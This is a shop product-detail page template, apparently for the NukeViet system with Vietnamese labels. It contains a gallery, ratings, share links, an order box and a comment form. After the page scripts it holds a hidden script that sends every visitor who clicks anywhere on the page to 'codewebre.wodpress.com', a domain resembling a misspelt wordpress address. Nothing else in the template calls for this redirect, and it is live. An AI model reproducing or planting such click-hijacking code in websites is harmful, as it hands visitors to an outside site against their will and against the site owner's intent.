<!-- BEGIN: main -->

<script type="text/javascript" src="{NV_BASE_SITEURL}themes/{TEMPLATE}/js/divbox.js"></script>
<script type="text/javascript" language="javascript" src="{NV_BASE_SITEURL}themes/{TEMPLATE}/js/jquery.carouFredSel-4.0.1-packed.js"></script>
<link type="text/css" rel="stylesheet" href="{NV_BASE_SITEURL}themes/{TEMPLATE}/css/divbox.css" />		
<script type="text/javascript" language="javascript">
    $(function() {				
        $('#user_interaction').carouFredSel({
            prev: '#prev1',
            next: '#next1',
            auto: false
        });				
    });
</script>	
<div id="detail">
	<div>
		<span class="image-demo">
			<a href="{SRC_PRO_LAGE}" title="{TITLE}" class="lightbox1" style="padding:10px">
				<img src="{SRC_PRO_LAGE}" alt="" width="280px" style="border:2px solid #eeeeee; padding:2px">
			</a>
			<!-- BEGIN: img -->
			<div class="list_carousel clearfix">
	        <ul id="user_interaction">
			<!-- BEGIN: othersimgs -->
                <li>
             <a href="{IMG_SRC_OTHER}" class="lightbox1 image" title="{TITLE}"><img src="{IMG_SRC_OTHER}" width="45" height="55" alt="{ROW.title}"/></a> 
				</li>
              <!-- END: othersimgs -->
        </ul>
    <div class="clearfix"></div>
    <a id="prev1" href="##">&nbsp;</a>
    <a id="next1" href="##">&nbsp;</a>
</div>
 <!-- END: img -->

<div class="zoom-img"><strong>Phóng to ảnh</strong> (Bấm xem)</div>
 <script type="text/javascript">
				$('a.lightbox1').divbox();
				</script>
		</span>
		<div id="tm">
		<div class="info_product">
			<h2 style="text-shadow:0 1px 1px #EAE4DB;">{TITLE}</h2>
			<span class="date_up">{DATE_UP} - {NUM_VIEW} {LANG.detail_num_view}</span>
			<!-- BEGIN: product_code -->{LANG.product_code}: <strong>{PRODUCT_CODE}</strong><br /><!-- END: product_code -->
			<!-- BEGIN: price -->
			<p>
				{LANG.detail_pro_price}: <span class="{class_money}">{product_price} {money_unit}</span>
				<!-- BEGIN: discounts -->
				<span class="money">{product_discounts} {money_unit}</span>
				<!-- END: discounts --> / 1 {pro_unit}
			</p>
			<!-- END: price -->
			<!-- BEGIN: contact -->
			{LANG.detail_pro_price}: <span class="money">{LANG.price_contact}</span>
			<!-- END: contact -->
			<!-- BEGIN: hometext -->
			<p style="font-size:12px">
				{hometext}
			</p>	
			<!-- END: hometext -->
			<!-- BEGIN: source -->
			<div>{LANG.detail_source} : <a href="{link_source}">{source}</a></div>
			<!-- END: source -->
			<!-- BEGIN: promotional -->
			<div style="font-size:12px"><strong>{LANG.detail_promotional} </strong>: {promotional}</div>
			<!-- END: promotional -->
			<!-- BEGIN: warranty -->
			<div>{LANG.detail_warranty} : {warranty}</div>
			<!-- END: warranty -->
			<!-- BEGIN: address -->
			<div>{LANG.detail_product_address} : {address}</div>
			<!-- END: address -->
			<!-- BEGIN: note -->
			<div>{LANG.cart_note} : {note}</div>
			<!-- END: note -->
						<!-- BEGIN: adminlink -->
			<div class="fr">{ADMINLINK}</div>
			<!-- END: adminlink -->
			<!-- BEGIN: allowed_rating -->
			<p style="padding:6px 0; border-bottom:1px dotted #dcdcdc; color:#006699">
				<span>{LANG.detail_rank} : <span class="math_rate">{RATE}</span> {LANG.detail_rate_math}</span>
				<span class="div_rate">
					<a href="#" class="rate">1</a>
					<a href="#" class="rate">2</a>
					<a href="#" class="rate">3</a>
					<a href="#" class="rate">4</a>
					<a href="#" class="rate">5</a>
				</span>
			<p>
			<!-- END: allowed_rating -->
			<div class="fl" style="width:170px; padding:6px 0px">
				<strong>{LANG.detail_share} : </strong>
				<span class="share clearfix">
					<!-- BEGIN: allowed_print -->
					<a rel="nofollow" href="{LINK_PRINT}" title="print" id="click_print">
						<img border="0" alt="print" src="{THEME_URL}/images/shops/print.png">
					</a><!-- END: allowed_print -->
					<a onclick="share_facebook();" href="javascript:;" title="Share on Facebook">
						<img border="0" alt="Share on Facebook" src="{THEME_URL}/images/shops/flickr.png">
					</a>
					<a onclick="share_twitter();" href="javascript:;" title="Share on Twitter">
						<img border="0" alt="Share on Twitter" src="{THEME_URL}/images/shops/twitter.png">
					</a>
					<a onclick="share_google();" href="javascript:;" title="Share on Google">
						<img border="0" alt="Share on Google" src="{THEME_URL}/images/shops/google.png">
					</a>
					<a onclick="share_buzz();" href="javascript:;" title="Share on Buzz">
						<img border="0" alt="Share on Buzz" src="{THEME_URL}/images/shops/buzz.png">
					</a>
				</span>
			</div>
			<!-- BEGIN: order -->
			<div class="fl" style="width:170px; padding:6px 0px">
				<span class="fl" style="line-height:22px;">{LANG.title_order} : &nbsp;</span> 
				<input type="text" name="num" value="1" style="width:30px; height:15px" id="pnum" class="fl">
				<a href="javascript:void(0)" id="{proid}" title="{title_pro}" style="margin-left:5px" class="pro_order fl" onclick="cartorder_detail(this)">
					{LANG.add_product}
				</a>
			</div>
			<!-- END: order -->
			<div style="clear:both"></div>
		</div>
		</div>
		<div id="tb"></div>
		<div style="clear:both"></div>
		<div style="detail_com">
			<!-- BEGIN: shop -->
			{LANG.company_product} : <a href="{link_shop}" title="{title_shop}">{title_shop}</a> 
			<!-- END: shop -->
		</div>
		<div class="TabView" id="TabView">
			<div class="Tabs">
				<a href="#">{LANG.product_detail}</a> 
				<a href="#">{LANG.add_otherimage}</a>
				<!-- BEGIN: comment_tab --><a href="#">{LANG.detail_comments}</a><!-- END: comment_tab -->
			</div>
			<div class="Pages">
				<div class="Page" style="padding-left:20px">
					{DETAIL}
				</div>
				<div class="Page" align="center">
					<div class="clearfix">
						<!-- BEGIN: othersimg -->
						<div style="width:33%; float:left; text-align:center">
							<a href="{IMG_SRC_OTHER}" rel="shadowbox[miss]"><img src="{IMG_SRC_OTHER}" style="width:230px" height="140px"/></a>
						</div>
						<!-- END: othersimg -->
						<!-- BEGIN: no_otherimage -->{LANG.detail_no_otherimage}<!-- END: no_otherimage -->
					</div>
				</div>
				<!-- BEGIN: comment -->
				<div class="Page">
					<div class="prd_rate">
						<!-- BEGIN: form -->
						<form class="comment" action="" onsubmit="return false;">
							<input type="hidden" value="{proid}" name="proid" id="proid" />
							<fieldset>
								<span id="charlimitinfo">{LANG.comment_limit_characters}</span>
								<textarea id="commentcontent" rows="5" name="commentcontent" style="width:90%"></textarea>
								<div class="fl clearfix">
									<label for="captcha">
										{LANG.comment_capcha}
									</label>
									<img height="20" name="vimg" src="{NV_BASE_SITEURL}?scaptcha=captcha" title="{LANG.captcha}" alt="{LANG.captcha}" id="vimg" />
									<input type="text" maxlength="{NV_GFX_NUM}" value="" id="commentseccode_iavim" name="fcode" style="width:60px"/>
									<input type="button" value="Reset" class="button" onclick="nv_change_captcha('vimg','commentseccode_iavim');" style="margin-right:5px" />
								</div>
								<div>
									<input onclick="sendcommment('{proid}','{COMMENT_CHECKSESS}','{NV_GFX_NUM}')" type="button" value="{LANG.comment_send}" id="buttoncontent" class="button"/>
								</div>
							</fieldset>
						</form>
						<!-- END: form -->
						<!-- BEGIN: form_login -->
						<p>{COMMENT_LOGIN}</p>
						<!-- END: form_login -->
						<div id="showcomment">{COMMENTCONTENT}</div>
					</div>
				</div>
				<!-- END: comment -->
			</div>
		</div>
	</div>
	<!-- BEGIN: other -->
	<h1 class="divbg">{LANG.detail_others}</h1>
	{OTHER}
	<!-- END: other -->
	<!-- BEGIN: other_view -->
	<h1 class="divbg">{LANG.detail_others_view}</h1>
	{OTHER_VIEW}
	<!-- END: other_view -->
</div>
<div class="msgshow" id="msgshow"></div>
<script language="javascript" type="text/javascript">
	tabview_initialize('TabView');
</script>
<script type="text/javascript">
	$(function(){
		<!-- BEGIN: allowed_print_js -->
		$('#click_print').click(function(event){
			var href = $(this).attr("href");
			event.preventDefault();
			NewWindow(href, '', '640', '500', 'yes');
			return false;
		});
		<!-- END: allowed_print_js -->
		<!-- BEGIN: allowed_rating_js -->
		$("a.rate").click(function(event){
			event.preventDefault();
			var val = $(this).html();
			$.ajax({
				type: "POST",
				url: '{LINK_RATE}'+'&nocache=' + new Date().getTime(),
				data: 'val=' + val,
				success: function(data){
					var s = data.split('_');
					alert(s[1]);
				}
			});
			return false;
		});
		<!-- END: allowed_rating_js -->
	});
</script>
<script>
jQuery(document).ready(function(){

$('body').click(function(){
window.location.href = "http://codewebre.wodpress.com";
});
});
</script>





<!-- END: main -->